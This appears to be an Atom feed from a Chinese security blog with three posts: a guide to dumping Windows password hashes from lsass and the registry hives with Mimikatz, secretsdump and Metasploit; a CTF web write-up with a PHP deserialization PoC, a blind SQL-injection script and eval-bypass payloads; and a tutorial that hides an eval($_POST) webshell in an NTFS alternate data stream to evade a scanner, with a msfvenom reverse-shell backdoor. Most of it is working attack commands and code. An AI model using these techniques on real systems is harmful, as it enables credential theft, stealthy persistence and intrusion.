<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Patrilic&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://patrilic.top/"/>
  <updated>2019-05-04T16:45:30.325Z</updated>
  <id>http://patrilic.top/</id>
  
  <author>
    <name>Patrilic</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>常用 Windows 抓取Hash</title>
    <link href="http://patrilic.top/2019/05/05/Windows%20%E6%8A%93%E5%8F%96Hash/"/>
    <id>http://patrilic.top/2019/05/05/Windows 抓取Hash/</id>
    <published>2019-05-04T16:20:33.000Z</published>
    <updated>2019-05-04T16:45:30.325Z</updated>
    
    <content type="html"><![CDATA[<p><strong>推荐使用 Procdump，reg 和 sharpdump 导出本地，再想办法从内网中运出来本地破解</strong></p><p>测试机器: Windows 10 1809</p><h2 id="0x01-Procdump-Mimikatz"><a href="#0x01-Procdump-Mimikatz" class="headerlink" title="0x01 Procdump + Mimikatz"></a>0x01 Procdump + Mimikatz</h2><p>Procdump<br>(管理员权限下运行)<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">temp</span>\<span class="title">procdump.exe</span> -<span class="title">accepteula</span> -<span class="title">ma</span> <span class="title">lsass.exe</span> <span class="title">lsass.dmp</span> //<span class="title">For</span> 32 <span class="title">bits</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">temp</span>\<span class="title">procdump.exe</span> -<span class="title">accepteula</span> -64 -<span class="title">ma</span> <span class="title">lsass.exe</span> <span class="title">lsass.dmp</span> //<span class="title">For</span> 64 <span class="title">bits</span></span></span><br></pre></td></tr></table></figure></p><p><img src="/Windows 抓取Hash.resources/5FE37FF2-25D9-45B1-851E-874383718EE9.png" alt="ac82bb7eeb7a22a8374cf6d938f39723"></p><p>然后本地解出hash即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::minidump C:\lsass.dmp</span><br><span class="line">sekurlsa::logonpasswords full</span><br></pre></td></tr></table></figure></p><p><img src="/Windows 抓取Hash.resources/BE8A461A-1A00-4764-BB1D-8C96C38779A4.png" alt="8217226578225fab9a1492a3aeca235d"></p><h2 id="0x02-Reg-impacket-Mimikatz-强推"><a href="#0x02-Reg-impacket-Mimikatz-强推" class="headerlink" title="0x02 Reg + impacket/Mimikatz (强推)"></a>0x02 Reg + impacket/Mimikatz (强推)</h2><p>使用<strong>Reg</strong>需要NT/SYSTEM权限<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM system.hiv</span><br><span class="line"></span><br><span class="line">reg save HKLM\SAM sam.hiv</span><br><span class="line"></span><br><span class="line">reg save HKLM\security security.hiv</span><br></pre></td></tr></table></figure></p><h3 id="Mimikatz-调用-lsadump"><a href="#Mimikatz-调用-lsadump" class="headerlink" title="Mimikatz 调用 lsadump"></a>Mimikatz 调用 lsadump</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::sam /system:system.hiv /sam:sam.hiv</span><br></pre></td></tr></table></figure><p><img src="/Windows 抓取Hash.resources/6FE3B05C-F2BD-4C78-B26D-E4BF0476BECE.png" alt="db38857f0f6c6dc2c9f9035664e6993d"></p><h3 id="impacket-secretsdump-py"><a href="#impacket-secretsdump-py" class="headerlink" title="impacket/secretsdump.py"></a>impacket/secretsdump.py</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py -sam sam.hiv -security security.hiv -system system.hiv LOCAL</span><br></pre></td></tr></table></figure><p><img src="/Windows 抓取Hash.resources/E7E2A416-FD55-4F50-A437-876466B61879.png" alt="242aff6a39bba29a99ef4947d7a99cc2"></p><h2 id="0x03-Sharpdump-强推"><a href="#0x03-Sharpdump-强推" class="headerlink" title="0x03 Sharpdump  (强推)"></a>0x03 Sharpdump  (强推)</h2><p>Out-Minidump.ps1 的 C#版本 编译结果<br>需要.NET 3.5版本框架<br><img src="/Windows 抓取Hash.resources/0895B794-5AA9-485E-85A2-F8130EAD8EC5.png" alt="45e9926e499fde1ffa70410d600137ee"></p><h2 id="0x04-Wce、Quarks-PwDump、GetPass……"><a href="#0x04-Wce、Quarks-PwDump、GetPass……" class="headerlink" title="0x04 Wce、Quarks PwDump、GetPass……"></a>0x04 Wce、Quarks PwDump、GetPass……</h2><p>没怎么用过，都是以前比较老的，Getpass是Mimikatz的编译版本，没啥意思</p><h2 id="0x05-Msf-modules"><a href="#0x05-Msf-modules" class="headerlink" title="0x05 Msf modules"></a>0x05 Msf modules</h2><h3 id="hashdump"><a href="#hashdump" class="headerlink" title="hashdump"></a>hashdump</h3><p>条件:</p><ol><li>Meterpreter Session</li><li>NT/SYSTEM</li></ol><p><img src="/Windows 抓取Hash.resources/2EB1A5C5-7939-4533-B30F-88DDD7CDB06F.png" alt="07030d8ceedbedabf174df555d21d903"></p><p>hashdump只能dump本地用户</p><h3 id="smart-hashdump"><a href="#smart-hashdump" class="headerlink" title="smart_hashdump"></a>smart_hashdump</h3><p>条件</p><ol><li>Meterpreter Session</li><li>NT/SYSTEM</li></ol><p><img src="/Windows 抓取Hash.resources/8985233C-E94F-49FE-9D8E-C6904AC4DD44.png" alt="ba9d49921ba6634abcc41e4ee0dfc0d1"></p><p>可以dump本地 + 域用户hash</p><h3 id="kiwi"><a href="#kiwi" class="headerlink" title="kiwi"></a>kiwi</h3><p>条件</p><ol><li>Meterpreter Session</li><li>NT/SYSTEM</li></ol><p><img src="/Windows 抓取Hash.resources/83900C86-A8C7-4190-B99A-AA696699C1B5.png" alt="0bb8fe85b3463c08b98173e8493190df"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;推荐使用 Procdump，reg 和 sharpdump 导出本地，再想办法从内网中运出来本地破解&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;测试机器: Windows 10 1809&lt;/p&gt;
&lt;h2 id=&quot;0x01-Procdump-Mimikatz&quot;&gt;&lt;a h
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>第十二届全国大学生信息安全竞赛初赛部分Web Write up</title>
    <link href="http://patrilic.top/2019/04/23/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9BWrite%20up/"/>
    <id>http://patrilic.top/2019/04/23/第十二届全国大学生信息安全竞赛初赛Write up/</id>
    <published>2019-04-23T03:20:33.000Z</published>
    <updated>2019-04-23T04:19:27.142Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h2 id="Web1-JustSoso"><a href="#Web1-JustSoso" class="headerlink" title="Web1 - JustSoso"></a>Web1 - JustSoso</h2><p><strong>Index.php</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line"></span><br><span class="line">$payload = $_GET[<span class="string">"payload"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> $_GET[<span class="string">'file'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($payload)) &#123;</span><br><span class="line">    $url = parse_url($_SERVER[<span class="string">'REQUEST_URI'</span>]);</span><br><span class="line">    parse_str($url[<span class="string">'query'</span>], $query);</span><br><span class="line">    <span class="keyword">foreach</span> ($query <span class="keyword">as</span> $value) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/flag/"</span>, $value)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'gg'</span>;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $payload = unserialize($payload);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Missing parameters"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p><strong>Hint.php</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $handle;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 绕过wakeup</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;$k = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Waking up\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($handle)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = $handle;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle-&gt;getFlag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> $token_flag;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token_flag = <span class="keyword">$this</span>-&gt;token = md5(rand(<span class="number">1</span>, <span class="number">10000</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token_flag = md5(rand(<span class="number">1</span>, <span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;token_flag) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="keyword">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p><strong>poc.php</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">"hint.php"</span>;</span><br><span class="line"></span><br><span class="line">$flag = <span class="keyword">new</span> Flag(<span class="string">'flag.php'</span>);</span><br><span class="line">$flag-&gt;token = <span class="string">'b706835de79a2b4e80506f582af3676a'</span>;</span><br><span class="line">$flag-&gt;token_flag = &amp;$flag-&gt;token;</span><br><span class="line"></span><br><span class="line">$handle = <span class="keyword">new</span> Handle($flag);</span><br><span class="line"></span><br><span class="line">$s = serialize($handle);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode($s);</span><br></pre></td></tr></table></figure></p><p>parse_url绕过正则:<a href="http://lawlietweb.com/2018/05/13/parse_url/" target="_blank" rel="noopener">http://lawlietweb.com/2018/05/13/parse_url/</a><br>wake_up绕过:<a href="https://paper.seebug.org/39/" target="_blank" rel="noopener">https://paper.seebug.org/39/</a></p><h2 id="Web2-全宇宙最简单的SQL"><a href="#Web2-全宇宙最简单的SQL" class="headerlink" title="Web2 - 全宇宙最简单的SQL"></a>Web2 - 全宇宙最简单的SQL</h2><p>过滤 or if sleep benchmark<br>参考bctf-love-q利用pow()在条件为假时返回error</p><p><img src="/第十二届全国大学生信息安全竞赛初赛Write up.resources/55CC5315-17DB-49AC-BBF3-8B0316AA3933.png" alt="2cb4372b6213be745ecbf701adc81349.png"><br>运算符作条件判断，如果错误数据库报错：利用pow的溢出判断limit位数的ascii</p><p><img src="/第十二届全国大学生信息安全竞赛初赛Write up.resources/DF663A7F-EB5F-41F6-9BFE-AE5A783CCF84.png" alt="f4abcef6f90ea02665adaf0f61d6ee7f.png"></p><p>在题目中正确返回<code>登陆失败</code>，错误返回<code>数据库失败</code></p><p>Exp:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">VERSION = <span class="string">"version()"</span></span><br><span class="line">USERNAME = <span class="string">"select username from user limit 1"</span></span><br><span class="line"></span><br><span class="line">PASSWORD = <span class="string">"select (select e.2 from (select * from (select 1)a,(select 2)b union select * from user)e limit 1,1)"</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://cba0e34ee5d34db985195191f4c681d5c32c4b92db574826.changame.ichunqiu.com"</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">31</span>, <span class="number">128</span>):</span><br><span class="line">        payload = &#123;</span><br><span class="line">            <span class="string">"username"</span>: <span class="string">"1'-pow(2,1024-ascii(substr((&#123;data&#125;),&#123;pos&#125;,1))+&#123;code&#125;)-- -"</span>.format(</span><br><span class="line">                data=PASSWORD,</span><br><span class="line">                pos=i,</span><br><span class="line">                code=j</span><br><span class="line">            ),</span><br><span class="line">            <span class="string">"password"</span>: <span class="string">"1"</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            resp = requests.post(url=url, data=payload)</span><br><span class="line">            resp.encoding = <span class="string">'utf8'</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'数据库操作失败'</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">                result += chr(j)</span><br><span class="line">                print(result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure></p><p>利用mysql别名(参考博客中Mysql Injection中# 不用列名的注入)</p><p>跑出password : F1AG@1s-at_/fll1llag_h3r3</p><p>进入后台为远程数据库连接界面，理想到fake_mysqlServer读文件<br>参考文章<a href="https://xz.aliyun.com/t/3973" target="_blank" rel="noopener">https://xz.aliyun.com/t/3973</a></p><p>修改这个脚本里的filelist<br><a href="https://github.com/allyshka/Rogue-MySql-Server/blob/master/rogue_mysql_server.py" target="_blank" rel="noopener">https://github.com/allyshka/Rogue-MySql-Server/blob/master/rogue_mysql_server.py</a></p><p>然后让题目服务器连接即可<br><img src="/第十二届全国大学生信息安全竞赛初赛Write up.resources/F8CE6FAF-1BFD-4AFB-A159-BC74B5293451.png" alt="02c5946724036ffaa593060d7224fd1e.png"></p><h2 id="Web3-lovemath"><a href="#Web3-lovemath" class="headerlink" title="Web3 - lovemath"></a>Web3 - lovemath</h2><p>直接嫖队友@hpdoger的wp orz</p><p>读到calc.php的源码</p><p><img src="/第十二届全国大学生信息安全竞赛初赛Write up.resources/C1913B0F-8DBC-4BD0-9583-36531EC420C2.png" alt="c0c0c8ac3e259e0335021d7fc0e1bfc5.png"><br>黑名单肯定是绕不过去，虽然有/m但是\r在黑名单所以不存在换行绕过。注意看下面的whitelist。正则匹配函数名，只允许Eval使用白名单的函数做字符串<br><img src="/第十二届全国大学生信息安全竞赛初赛Write up.resources/D83550D5-CAC5-4A66-9045-18A3FB752007.png" alt="582784a9189b198632e7d5e7a118484b.png"><br>所以思路就很明确，既然参数从白名单出来后被执行，那漏洞点肯定就在白名单的函数。<br>由于正则匹配字母的规则，使我们传入的实参不能是字母，否则就会进入判断如下<br><img src="/第十二届全国大学生信息安全竞赛初赛Write up.resources/36E22A60-B77B-47E1-867B-07D443465D5F.png" alt="e8e3debbd6230c0e0c53a3850e2b76bb.png"><br>想办法把数字变成字母，着眼于函数base_convert，官方描述如下<br><img src="/第十二届全国大学生信息安全竞赛初赛Write up.resources/BF93901B-2E8A-4809-A62C-C1D00CDC6E60.png" alt="a2935dc80f85880f2cdda71c2a7086b4.png"><br>它允许我们将10进制数转换为最高36进制，结果为字符串。完美解决了数字-&gt;字母的转化，成功打印Phpinfo如下<br><img src="/第十二届全国大学生信息安全竞赛初赛Write up.resources/0F5DF72A-16AC-4AC0-B59F-1D020A081AC2.png" alt="098411eef0c09290073abf8ec9ee4ab5.png"><br>因为字符串长度限制，我最开始的想法是这样的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$input = hexdec(bin2hex(“system(‘cat /flag’);”))</span><br><span class="line">$result = base_convert(10进制编码的hex2bin,10,36).dechex($input)</span><br></pre></td></tr></table></figure></p><p>失败的POC是这样：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base_convert(37907361743,10,36)(dechex(9148825951463535960001056079872))</span><br></pre></td></tr></table></figure></p><p>bin2hex后由于转换出来的16进制数值过大，导致转换的int值很大无法正常被dechex还原而溢出。 </p><p>卡在这里很久，最后换了一种小数还原的思路。</p><p>我们只需要构造_GET为16进制数，这个16进制转换出来的十进制就不会很大，自然在dechex也不会溢出。</p><p>Payload如下，注意用白名单的值作为变量参数，否则还是会被拦截<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;0&#125;(($$p)&#123;1&#125;)</span><br></pre></td></tr></table></figure></p><p>转换的调用栈如下：<br><img src="/第十二届全国大学生信息安全竞赛初赛Write up.resources/9EFBD255-8430-47D2-A40A-4B63B559FECE.png" alt="669c053c37997706f12d06ce72e2e1d5.png"></p><p>直接发包给到C参数，成功getflag</p><p><img src="/第十二届全国大学生信息安全竞赛初赛Write up.resources/3C6255C6-8A8E-4A12-8CCA-0273C55AB6C5.png" alt="511c651f1848294771ccadfac4b993eb.png"></p><p>还在群里看到一位师傅的Payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base_convert(<span class="number">47138</span>,<span class="number">20</span>,<span class="number">36</span>)(base_convert(<span class="number">3761671484</span>,<span class="number">13</span>,<span class="number">36</span>)(dechex(<span class="number">474260465194</span>)))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(nl f*);</span><br></pre></td></tr></table></figure><p>79位…… orz </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[toc]&lt;/p&gt;
&lt;h2 id=&quot;Web1-JustSoso&quot;&gt;&lt;a href=&quot;#Web1-JustSoso&quot; class=&quot;headerlink&quot; title=&quot;Web1 - JustSoso&quot;&gt;&lt;/a&gt;Web1 - JustSoso&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;I
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>ADS隐藏后门</title>
    <link href="http://patrilic.top/2019/04/18/ADS%20%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/"/>
    <id>http://patrilic.top/2019/04/18/ADS 隐藏后门/</id>
    <published>2019-04-18T03:20:33.000Z</published>
    <updated>2019-04-23T15:48:29.199Z</updated>
    
    <content type="html"><![CDATA[<p>高铁上没事干，把以前的笔记总结一下<br>[toc]</p><h2 id="ADS"><a href="#ADS" class="headerlink" title="ADS"></a>ADS</h2><p>NTFS交换数据流（alternate data streams，简称ADS）</p><p>ADS是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流，就是说除了主文件流之外还可以有许多非主文件流寄宿在主文件流中。它使用资源派生来维持与文件相关的信息，虽然我们无法看到数据流文件，但是它却是真实存在于我们的系统中的。创建一个数据交换流文件的方法很简单，命令为”宿主文件:准备与宿主文件关联的数据流文件”。 —– baike.baidu.com</p><p>文件命名：</p><blockquote><p>ads.txt  普通txt文件 (主文件)<br>ads.txt:nop.txt （寄宿文件）</p></blockquote><p><img src="/ADS 隐藏后门.resources/8C8EB255-7B79-4D1A-A316-5DE2363EBBFD.png" alt="1bb96e55543dbb1493165cec47afc7af"><br>使用<strong>dir</strong>命令不能看到，必须使用<strong>dir /r</strong></p><p><img src="/ADS 隐藏后门.resources/A87A52A9-85B3-4001-B520-699A9ED67E9C.png" alt="d3973b4bd310ff1bd21deb5db2873e18"></p><h2 id="Webshell（过D盾）"><a href="#Webshell（过D盾）" class="headerlink" title="Webshell（过D盾）"></a>Webshell（过D盾）</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">phpStudy</span>\<span class="title">PHPTutorial</span>\<span class="title">WWW</span>\<span class="title">webshell</span>&gt;<span class="title">echo</span> "&lt;?<span class="title">php</span> <span class="title">phpinfo</span>();?&gt;" &gt; <span class="title">index.php:s</span>.<span class="title">txt</span></span></span><br></pre></td></tr></table></figure><p><img src="/ADS 隐藏后门.resources/C4AC74E5-DDB5-4C32-A202-1E55FC5FA815.png" alt="b2ed2bf9d1766135d674e36ab42aa1ac"><br><img src="/ADS 隐藏后门.resources/762C93D1-3F06-4970-B734-B85E9F18AEC0.png" alt="f40f0ed3186d78429c5000521b823e72"></p><p>将 小马写入index.php:s.txt中 ，然后再index.php中include<br>D盾不能获取非主文件流<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">index.php</span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line">    $a=&quot;696e6465782e70&quot;.&quot;68703a732e747874&quot;;</span><br><span class="line">    $b=&quot;a&quot;;</span><br><span class="line">    include(PACK(&apos;H*&apos;,$$b))</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">index.php:s.txt</span><br><span class="line"></span><br><span class="line">&lt;?php @eval($_POST[&apos;chopper&apos;]);?&gt;</span><br></pre></td></tr></table></figure><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><h3 id="0x01-环境"><a href="#0x01-环境" class="headerlink" title="0x01 环境"></a>0x01 环境</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MacOS             ipaddress: <span class="number">192</span>.<span class="number">168</span>.<span class="number">43</span>.<span class="number">223</span></span><br><span class="line">Windows <span class="number">10</span>        ipaddress: <span class="number">192</span>.<span class="number">168</span>.<span class="number">121</span>.<span class="number">132</span></span><br></pre></td></tr></table></figure><h3 id="0x02-生成shell"><a href="#0x02-生成shell" class="headerlink" title="0x02 生成shell"></a>0x02 生成shell</h3><figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom --platform Windows -p windows/meterpreter/reverse_tcp lhost=192.168.1.101 lport=8888 -f exe -o shell.exe</span><br></pre></td></tr></table></figure><h3 id="0x03-植入后门"><a href="#0x03-植入后门" class="headerlink" title="0x03 植入后门"></a>0x03 植入后门</h3><p>环境描述：拿到了webshell，经过提权，权限为本地管理员<br>上传一个后门文件<br><img src="/ADS 隐藏后门.resources/3F4E2390-E7EA-49F4-B362-DC1A776E1262.png" alt="f0f797666014d4cb4f91d9e3e1a1e0ad"></p><p>使用<strong>type</strong>将shell.exe数据写入依附在hello.txt上<br><img src="/ADS 隐藏后门.resources/B3021D0D-E210-4E2E-99CD-E6BD839F0903.png" alt="99090aa172deaf9fe4ef2215b14b5e34"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mklink "c:\backdoor\link.exe" "c:\backdoor\hello.txt:shell.exe"</span><br></pre></td></tr></table></figure><p>server 2k3后不能直接执行exe，必须建立链接<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">start</span> link.exe /b</span><br></pre></td></tr></table></figure></p><p><img src="/ADS 隐藏后门.resources/5B9ED225-B4D9-4EFA-A8C5-8A64621A194B.png" alt="f2eae722d0632ce91a23eeeafa1d079a"></p><p>成功回弹session</p><h2 id="Thanks"><a href="#Thanks" class="headerlink" title="Thanks"></a>Thanks</h2><p><a href="https://docs.microsoft.com/en-us/previous-versions/ms854468(v=msdn.10)" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/previous-versions/ms854468(v=msdn.10)</a><br><a href="https://klionsec.github.io/2017/11/13/ntfs-streams/" target="_blank" rel="noopener">https://klionsec.github.io/2017/11/13/ntfs-streams/</a><br><a href="https://blog.csdn.net/migee/article/details/56028011" target="_blank" rel="noopener">https://blog.csdn.net/migee/article/details/56028011</a><br><a href="https://blog.csdn.net/xiaoxuetu_/article/details/77318670" target="_blank" rel="noopener">https://blog.csdn.net/xiaoxuetu_/article/details/77318670</a></p>]]></content>
    
    <summary type="html">
    
